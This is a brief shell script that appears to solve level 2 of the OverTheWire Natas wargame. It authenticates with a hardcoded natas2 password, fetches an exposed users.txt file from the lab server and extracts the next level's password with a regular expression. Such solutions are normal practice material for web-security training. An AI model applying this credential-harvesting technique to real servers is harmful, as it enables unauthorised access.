#!/bin/sh

RESPONSE=$(curl --silent \
                --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi \
                http://natas2.natas.labs.overthewire.org/files/users.txt)
PASSWORD=$(echo ${RESPONSE} | grep -Po "(?<=natas3:)[A-Za-z0-9]{32}")
printf "The password for natas03 is: ${PASSWORD}\n"
